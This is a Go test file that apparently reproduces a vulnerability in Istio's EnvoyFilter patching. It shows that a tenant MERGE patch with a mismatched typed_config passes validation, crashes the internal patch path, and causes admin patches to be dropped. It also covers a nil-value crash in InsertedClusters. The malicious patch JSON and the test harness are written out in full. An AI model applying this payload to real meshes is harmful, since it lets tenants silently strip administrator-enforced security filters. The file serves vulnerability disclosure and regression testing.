// ZERO-DAY REPRODUCER — EnvoyFilter merge descriptor-mismatch panic.
// Placed in-package to drive BOTH the recovered public entrypoint
// (ApplyListenerPatches) and the internal unrecovered path (patchListeners),
// and to prove the malicious patch passes ValidateEnvoyFilter.
package envoyfilter

import (
	"testing"

	listener "github.com/envoyproxy/go-control-plane/envoy/config/listener/v3"
	router "github.com/envoyproxy/go-control-plane/envoy/extensions/filters/http/router/v3"
	hcm "github.com/envoyproxy/go-control-plane/envoy/extensions/filters/network/http_connection_manager/v3"

	meshconfig "istio.io/api/mesh/v1alpha1"
	networking "istio.io/api/networking/v1alpha3"
	"istio.io/istio/pilot/pkg/config/memory"
	"istio.io/istio/pilot/pkg/model"
	memregistry "istio.io/istio/pilot/pkg/serviceregistry/memory"
	"istio.io/istio/pilot/pkg/util/protoconv"
	"istio.io/istio/pkg/config"
	"istio.io/istio/pkg/config/schema/collections"
	"istio.io/istio/pkg/config/schema/gvk"
	valef "istio.io/istio/pkg/config/validation/envoyfilter"
	"istio.io/istio/pkg/config/xds"
	"istio.io/istio/pkg/wellknown"
)

// build the EXACT patch value that model.convertToEnvoyFilterWrapper would build:
// BuildXDSObjectFromStruct(NETWORK_FILTER, <struct>) => *listener.Filter whose
// typed_config is an Any of type ...Cluster (a DIFFERENT type than the target HCM).
func mismatchedNetworkFilterValue(t *testing.T) *listener.Filter {
	t.Helper()
	// JSON struct as a tenant would write it in the EnvoyFilter patch.value
	val := buildPatchStruct(`{
		"name": "envoy.filters.network.http_connection_manager",
		"typed_config": {
			"@type": "type.googleapis.com/envoy.config.cluster.v3.Cluster",
			"name": "attacker-cluster"
		}
	}`)
	msg, err := xds.BuildXDSObjectFromStruct(networking.EnvoyFilter_NETWORK_FILTER, val, false)
	if err != nil {
		t.Fatalf("BuildXDSObjectFromStruct failed (would have been rejected): %v", err)
	}
	f, ok := msg.(*listener.Filter)
	if !ok {
		t.Fatalf("expected *listener.Filter, got %T", msg)
	}
	return f
}

// a realistic HTTP listener: one filter chain, one HCM network filter that itself
// carries an http_connection_manager typed_config with a router http filter.
func httpListener() *listener.Listener {
	hcmAny := protoconv.MessageToAny(&hcm.HttpConnectionManager{
		StatPrefix: "inbound",
		HttpFilters: []*hcm.HttpFilter{
			{
				Name:       "envoy.filters.http.router",
				ConfigType: &hcm.HttpFilter_TypedConfig{TypedConfig: protoconv.MessageToAny(&router.Router{})},
			},
		},
	})
	return &listener.Listener{
		Name: "virtualInbound",
		FilterChains: []*listener.FilterChain{
			{
				Name: "fc0",
				Filters: []*listener.Filter{
					{
						Name:       wellknown.HTTPConnectionManager,
						ConfigType: &listener.Filter_TypedConfig{TypedConfig: hcmAny},
					},
				},
			},
		},
	}
}

// tenant patch wrapper: applyTo=NETWORK_FILTER MERGE, matches the HCM filter by name.
func tenantMergePatch(t *testing.T) *model.EnvoyFilterConfigPatchWrapper {
	return &model.EnvoyFilterConfigPatchWrapper{
		Name:      "tenant-ef",
		Namespace: "tenant-ns",
		FullName:  "tenant-ns/tenant-ef",
		ApplyTo:   networking.EnvoyFilter_NETWORK_FILTER,
		Operation: networking.EnvoyFilter_Patch_MERGE,
		Value:     mismatchedNetworkFilterValue(t),
		Match: &networking.EnvoyFilter_EnvoyConfigObjectMatch{
			Context: networking.EnvoyFilter_ANY,
			ObjectTypes: &networking.EnvoyFilter_EnvoyConfigObjectMatch_Listener{
				Listener: &networking.EnvoyFilter_ListenerMatch{
					FilterChain: &networking.EnvoyFilter_ListenerMatch_FilterChainMatch{
						Filter: &networking.EnvoyFilter_ListenerMatch_FilterMatch{
							Name: wellknown.HTTPConnectionManager,
						},
					},
				},
			},
		},
	}
}

// "admin" patch (as if from the mesh root namespace): remove the router http filter.
// This models an admin-enforced hardening patch that ALSO applies to the tenant proxy.
func adminRemoveRouterPatch() *model.EnvoyFilterConfigPatchWrapper {
	return &model.EnvoyFilterConfigPatchWrapper{
		Name:      "admin-ef",
		Namespace: "istio-system",
		FullName:  "istio-system/admin-ef",
		ApplyTo:   networking.EnvoyFilter_HTTP_FILTER,
		Operation: networking.EnvoyFilter_Patch_ADD,
		Value: &hcm.HttpFilter{
			Name:       "admin.injected.marker",
			ConfigType: &hcm.HttpFilter_TypedConfig{TypedConfig: protoconv.MessageToAny(&router.Router{})},
		},
		Match: &networking.EnvoyFilter_EnvoyConfigObjectMatch{Context: networking.EnvoyFilter_ANY},
	}
}

// Step 1: prove the INTERNAL patch path (no recover) actually panics.
func TestZeroDay_RawPanic_Internal(t *testing.T) {
	efw := &model.MergedEnvoyFilterWrapper{
		Patches: map[networking.EnvoyFilter_ApplyTo][]*model.EnvoyFilterConfigPatchWrapper{
			networking.EnvoyFilter_NETWORK_FILTER: {tenantMergePatch(t)},
		},
	}
	panicked := false
	func() {
		defer func() {
			if r := recover(); r != nil {
				panicked = true
				t.Logf("INTERNAL patchListeners PANICKED: %v", r)
			}
		}()
		patchListeners(networking.EnvoyFilter_SIDECAR_INBOUND, efw, []*listener.Listener{httpListener()}, false)
	}()
	if !panicked {
		t.Fatalf("expected internal patch path to panic on descriptor mismatch, but it did not")
	}
}

// Step 2: the PUBLIC entrypoint recovers, but silently drops ALL co-applied patches
// (including the admin/root-namespace one) for this proxy.
func TestZeroDay_PublicRecovers_DropsAdminPatch(t *testing.T) {
	efw := &model.MergedEnvoyFilterWrapper{
		Patches: map[networking.EnvoyFilter_ApplyTo][]*model.EnvoyFilterConfigPatchWrapper{
			networking.EnvoyFilter_HTTP_FILTER:    {adminRemoveRouterPatch()},
			networking.EnvoyFilter_NETWORK_FILTER: {tenantMergePatch(t)},
		},
	}
	in := []*listener.Listener{httpListener()}
	out := ApplyListenerPatches(networking.EnvoyFilter_SIDECAR_INBOUND, efw, in, false)

	// Extract the HCM's http filters from the (recovered) output.
	got := out[0].FilterChains[0].Filters[0]
	hc := &hcm.HttpConnectionManager{}
	if err := got.GetTypedConfig().UnmarshalTo(hc); err != nil {
		t.Fatalf("unmarshal hcm: %v", err)
	}
	names := []string{}
	for _, f := range hc.HttpFilters {
		names = append(names, f.Name)
	}
	t.Logf("http filters after ApplyListenerPatches (recovered): %v", names)

	// The admin ADD patch should have injected "admin.injected.marker".
	// Because the tenant patch panicked, the admin patch was dropped.
	hasAdmin := false
	for _, n := range names {
		if n == "admin.injected.marker" {
			hasAdmin = true
		}
	}
	if hasAdmin {
		t.Fatalf("admin patch WAS applied — no drop happened")
	}
	t.Logf("CONFIRMED: admin/root-namespace HTTP_FILTER patch was DROPPED because tenant NETWORK_FILTER MERGE panicked and the whole listener patch set was abandoned")

	// Sanity: with ONLY the admin patch, it IS applied (proves the drop is caused by the tenant patch).
	efwAdminOnly := &model.MergedEnvoyFilterWrapper{
		Patches: map[networking.EnvoyFilter_ApplyTo][]*model.EnvoyFilterConfigPatchWrapper{
			networking.EnvoyFilter_HTTP_FILTER: {adminRemoveRouterPatch()},
		},
	}
	out2 := ApplyListenerPatches(networking.EnvoyFilter_SIDECAR_INBOUND, efwAdminOnly, []*listener.Listener{httpListener()}, false)
	hc2 := &hcm.HttpConnectionManager{}
	_ = out2[0].FilterChains[0].Filters[0].GetTypedConfig().UnmarshalTo(hc2)
	found := false
	for _, f := range hc2.HttpFilters {
		if f.Name == "admin.injected.marker" {
			found = true
		}
	}
	if !found {
		t.Fatalf("control case failed: admin patch should apply when tenant patch absent")
	}
	t.Logf("CONTROL: without the tenant patch, the admin patch applies normally")
}

// Step 3: prove the malicious tenant EnvoyFilter PASSES ValidateEnvoyFilter.
func TestZeroDay_PassesValidation(t *testing.T) {
	val := buildPatchStruct(`{
		"name": "envoy.filters.network.http_connection_manager",
		"typed_config": {
			"@type": "type.googleapis.com/envoy.config.cluster.v3.Cluster",
			"name": "attacker-cluster"
		}
	}`)
	ef := &networking.EnvoyFilter{
		ConfigPatches: []*networking.EnvoyFilter_EnvoyConfigObjectPatch{
			{
				ApplyTo: networking.EnvoyFilter_NETWORK_FILTER,
				Match: &networking.EnvoyFilter_EnvoyConfigObjectMatch{
					Context: networking.EnvoyFilter_ANY,
					ObjectTypes: &networking.EnvoyFilter_EnvoyConfigObjectMatch_Listener{
						Listener: &networking.EnvoyFilter_ListenerMatch{
							FilterChain: &networking.EnvoyFilter_ListenerMatch_FilterChainMatch{
								Filter: &networking.EnvoyFilter_ListenerMatch_FilterMatch{
									Name: wellknown.HTTPConnectionManager,
								},
							},
						},
					},
				},
				Patch: &networking.EnvoyFilter_Patch{
					Operation: networking.EnvoyFilter_Patch_MERGE,
					Value:     val,
				},
			},
		},
	}
	cfg := config.Config{
		Meta: config.Meta{Name: "tenant-ef", Namespace: "tenant-ns", GroupVersionKind: gvk.EnvoyFilter},
		Spec: ef,
	}
	warn, err := valef.ValidateEnvoyFilter(cfg)
	if err != nil {
		t.Fatalf("VALIDATION REJECTED the malicious patch (so not exploitable via admission): %v", err)
	}
	t.Logf("CONFIRMED: ValidateEnvoyFilter ACCEPTS the malicious patch (warning=%v, err=nil)", warn)
}

// REFUTATION of the cross-namespace scoping hypothesis: an EnvoyFilter created in
// "attacker-ns" (non-root) must NOT be selected for a proxy in "victim-ns".
func TestZeroDay_Scoping_NamespaceIsolation(t *testing.T) {
	store := memory.NewController(memory.Make(collections.Pilot))
	// Attacker EF in attacker-ns: a REMOVE-everything listener patch (no workloadSelector).
	mustCreate(t, store, "attacker-ns", "evil", &networking.EnvoyFilter{
		ConfigPatches: []*networking.EnvoyFilter_EnvoyConfigObjectPatch{
			{
				ApplyTo: networking.EnvoyFilter_LISTENER,
				Patch:   &networking.EnvoyFilter_Patch{Operation: networking.EnvoyFilter_Patch_REMOVE},
			},
		},
	})
	mesh := &meshconfig.MeshConfig{RootNamespace: "istio-system"}
	e := newTestEnvironment(t, memregistry.NewServiceDiscovery(), mesh, store)
	push := model.NewPushContext()
	push.InitContext(e, nil, nil)

	victim := &model.Proxy{Type: model.SidecarProxy, ConfigNamespace: "victim-ns", Metadata: &model.NodeMetadata{}}
	attacker := &model.Proxy{Type: model.SidecarProxy, ConfigNamespace: "attacker-ns", Metadata: &model.NodeMetadata{}}

	if efw := push.EnvoyFilters(victim); efw != nil && len(efw.Patches) > 0 {
		t.Fatalf("SCOPING BUG: attacker-ns EnvoyFilter leaked to victim-ns proxy: %+v", efw.Patches)
	}
	t.Logf("REFUTED cross-namespace scoping: victim-ns proxy sees NO attacker patches")

	if efw := push.EnvoyFilters(attacker); efw == nil || len(efw.Patches[networking.EnvoyFilter_LISTENER]) == 0 {
		t.Fatalf("expected attacker-ns proxy to see its own EnvoyFilter")
	}
	t.Logf("CONTROL: attacker-ns proxy DOES see its own EnvoyFilter (scoping is same-namespace-only)")
}

// Document the ONE unrecovered crash primitive: InsertedClusters (no HandleCrash)
// panics on a CLUSTER/ADD patch with a nil Value. This requires validation to be
// bypassed/disabled (validation rejects non-REMOVE ops with nil value), so it is a
// defense-in-depth gap rather than an admission-reachable zero-day.
func TestZeroDay_InsertedClusters_NilValue_Unrecovered(t *testing.T) {
	efw := &model.MergedEnvoyFilterWrapper{
		Patches: map[networking.EnvoyFilter_ApplyTo][]*model.EnvoyFilterConfigPatchWrapper{
			networking.EnvoyFilter_CLUSTER: {
				{
					FullName:  "attacker-ns/nilcluster",
					ApplyTo:   networking.EnvoyFilter_CLUSTER,
					Operation: networking.EnvoyFilter_Patch_ADD,
					Value:     nil, // untyped-nil proto.Message
					Match:     &networking.EnvoyFilter_EnvoyConfigObjectMatch{Context: networking.EnvoyFilter_SIDECAR_OUTBOUND},
				},
			},
		},
	}
	panicked := false
	func() {
		defer func() {
			if r := recover(); r != nil {
				panicked = true
				t.Logf("InsertedClusters PANICKED (UNRECOVERED in prod): %v", r)
			}
		}()
		_ = InsertedClusters(networking.EnvoyFilter_SIDECAR_OUTBOUND, efw)
	}()
	if !panicked {
		t.Fatalf("expected InsertedClusters to panic on nil value")
	}
}

func mustCreate(t *testing.T, store model.ConfigStoreController, ns, name string, spec *networking.EnvoyFilter) {
	t.Helper()
	if _, err := store.Create(config.Config{
		Meta: config.Meta{Name: name, Namespace: ns, GroupVersionKind: gvk.EnvoyFilter},
		Spec: spec,
	}); err != nil {
		t.Fatalf("create ef %s/%s: %v", ns, name, err)
	}
}
